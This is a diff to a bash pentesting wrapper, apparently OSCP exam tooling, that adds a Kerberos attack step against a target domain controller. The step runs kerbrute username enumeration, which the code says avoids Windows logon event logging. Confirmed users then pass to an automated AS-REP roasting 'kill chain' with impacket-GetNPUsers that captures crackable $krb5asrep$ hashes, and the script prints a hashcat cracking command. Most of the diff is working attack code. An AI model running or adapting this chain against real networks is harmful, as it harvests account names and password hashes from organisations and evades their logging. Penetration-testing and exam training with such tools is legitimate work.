@@ -49,6 +49,16 @@ if [[ -z "$TARGET" || -z "$OUTPUT_DIR" ]]; then
     exit 1
 fi
 
+# ---------------------------------------------------------------------------
+# Step A — Domain resolution: use domain.txt written by the Python engine
+# if --domain was not supplied on the command line.
+# ---------------------------------------------------------------------------
+DOMAIN_FILE="${OUTPUT_DIR}/domain.txt"
+if [[ -z "$DOMAIN" && -f "$DOMAIN_FILE" ]]; then
+    DOMAIN=$(cat "$DOMAIN_FILE" | tr -d '[:space:]')
+    [[ -n "$DOMAIN" ]] && ok "Domain read from domain.txt: ${WHITE}${DOMAIN}${NC}"
+fi
+
 LDAP_DIR="${OUTPUT_DIR}/ldap"
 mkdir -p "$LDAP_DIR"
 
@@ -278,10 +288,9 @@ echo ""
 # ===========================================================================
 # 6 — Kerberos pre-auth check (port 88) — detection only
 # ===========================================================================
-info "[6/6] Kerberos port check"
+info "[6/7] Kerberos port check"
 if nmap -p88 --open -Pn "$TARGET" 2>/dev/null | grep -q "88/tcp.*open"; then
     ok "Kerberos port 88 is open — this is likely a Domain Controller."
-    session_add_note() { true; }  # notes go through Python layer
 
     hint "AS-REP Roasting (run manually — requires user list):
     impacket-GetNPUsers <DOMAIN>/ -dc-ip ${TARGET} -no-pass \\
@@ -302,6 +311,126 @@ if nmap -p88 --open -Pn "$TARGET" 2>/dev/null | grep -q "88/tcp.*open"; then
     bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc ${TARGET} -c All"
 else
     info "Port 88 not open — target may not be a Domain Controller."
+fi
+
+# ===========================================================================
+# 7 — kerbrute — Kerberos username enumeration
+#
+# Validates username existence against Kerberos (port 88) WITHOUT triggering
+# standard Windows authentication event logging (4625/4771).  Only AS-REQ
+# messages are sent — no authentication is attempted.
+#
+# OSCP compliance:
+#   - Pure enumeration — no passwords tried
+#   - Respects OSCP's "no brute force" rule (wordlist = known usernames, not
+#     password attempts)
+#   - Tool must be pre-installed (never auto-downloaded from internet)
+# ===========================================================================
+echo ""
+info "[7/7] kerbrute — Kerberos username enumeration (AS-REQ probe)"
+
+if [[ -z "$DOMAIN" ]]; then
+    warn "No domain supplied — skipping kerbrute."
+    hint "Rerun with --domain once the domain is known:
+    bash wrappers/ldap_enum.sh --target ${TARGET} --output-dir <DIR> --domain <DOMAIN>"
+
+elif ! command -v kerbrute &>/dev/null; then
+    skip "kerbrute"
+    hint "Install kerbrute (pre-built binary — no internet needed during exam):
+    wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \\
+         -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute"
+
+else
+    # ------------------------------------------------------------------
+    # Step B — Wordlist resolution — tiered priority
+    #   1. SecLists names.txt    (~10k common first-last names)
+    #   2. SecLists xato usernames (~10M entries — slower, broader)
+    #   3. Metasploit unix_users  (Kali fallback, always available)
+    # ------------------------------------------------------------------
+    WL_KERB=""
+    for f in \
+        "/usr/share/seclists/Usernames/Names/names.txt" \
+        "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt" \
+        "/usr/share/wordlists/metasploit/unix_users.txt"; do
+        [[ -f "$f" ]] && WL_KERB="$f" && break
+    done
+
+    if [[ -z "$WL_KERB" ]]; then
+        warn "No username wordlist found — skipping kerbrute."
+        hint "Install seclists: sudo apt install seclists"
+    else
+        KERB_OUT="${LDAP_DIR}/kerbrute_users.txt"
+        VALID_USERS="${LDAP_DIR}/valid_users.txt"
+        info "Wordlist: ${WHITE}${WL_KERB}${NC}"
+
+        cmd "kerbrute userenum -d $DOMAIN --dc $TARGET $WL_KERB -o $KERB_OUT"
+        kerbrute userenum \
+            -d "$DOMAIN" \
+            --dc "$TARGET" \
+            "$WL_KERB" \
+            -o "$KERB_OUT" \
+            2>&1 | tee "${KERB_OUT}.log" || true
+
+        # Merge any confirmed kerbrute users into the master ldap_users.txt
+        if [[ -f "$KERB_OUT" ]]; then
+            grep -oP '(?<=VALID USERNAME:\s{1,20})[^@\s]+' "$KERB_OUT" 2>/dev/null \
+                >> "${LDAP_DIR}/ldap_users.txt" || true
+            sort -u "${LDAP_DIR}/ldap_users.txt" \
+                -o "${LDAP_DIR}/ldap_users.txt" 2>/dev/null || true
+
+            # Extract clean username list to valid_users.txt for the kill chain
+            grep -oP '(?<=VALID USERNAME:\s{1,20})[^@\s]+' "$KERB_OUT" 2>/dev/null \
+                | sort -u > "$VALID_USERS" || true
+
+            VALID_COUNT=$(wc -l < "$VALID_USERS" 2>/dev/null || echo 0)
+            if [[ "$VALID_COUNT" -gt 0 ]]; then
+                ok "${RED}kerbrute: ${VALID_COUNT} VALID USERNAME(S) confirmed!${NC} → ${VALID_USERS}"
+
+                # ============================================================
+                # Step C — THE KILL: AS-REP Roast immediately on valid users
+                # ============================================================
+                echo ""
+                echo -e "  ${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
+                echo -e "  ${RED}${BOLD}║  KILL CHAIN: RUNNING AS-REP ROAST — CAPTURING HASHES    ║${NC}"
+                echo -e "  ${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
+                echo ""
+
+                HASH_OUT="${LDAP_DIR}/asreproast.hashes"
+
+                if command -v impacket-GetNPUsers &>/dev/null; then
+                    cmd "impacket-GetNPUsers ${DOMAIN}/ -usersfile ${VALID_USERS} -no-pass -dc-ip ${TARGET} -format hashcat"
+                    impacket-GetNPUsers "${DOMAIN}/" \
+                        -usersfile "$VALID_USERS" \
+                        -no-pass \
+                        -dc-ip "$TARGET" \
+                        -format hashcat \
+                        2>&1 | tee "$HASH_OUT" || true
+
+                    # Filter out non-hash lines (info/error output) so the file
+                    # contains only raw $krb5asrep$ entries
+                    grep '^\$krb5asrep\$' "$HASH_OUT" > "${HASH_OUT}.clean" 2>/dev/null || true
+                    if [[ -s "${HASH_OUT}.clean" ]]; then
+                        mv "${HASH_OUT}.clean" "$HASH_OUT"
+                        HASH_COUNT=$(wc -l < "$HASH_OUT")
+                        echo ""
+                        echo -e "  ${RED}${BOLD}[!!!] ${HASH_COUNT} AS-REP HASH(ES) CAPTURED → ${HASH_OUT}${NC}"
+                        echo -e "  ${RED}${BOLD}[!!!] CRACK WITH:${NC}"
+                        echo -e "  ${WHITE}  hashcat -m 18200 ${HASH_OUT} /usr/share/wordlists/rockyou.txt \\${NC}"
+                        echo -e "  ${WHITE}      -r /usr/share/john/rules/best64.rule${NC}"
+                        echo ""
+                    else
+                        rm -f "${HASH_OUT}.clean"
+                        info "GetNPUsers ran — no AS-REP hashes returned (all accounts require pre-auth)"
+                    fi
+                else
+                    warn "impacket-GetNPUsers not found — skipping AS-REP Roast."
+                    hint "Install: pip3 install impacket"
+                fi
+            else
+                info "kerbrute: no usernames confirmed valid (pre-auth may be required for all)"
+            fi
+        fi
+    fi
 fi
 
 echo ""
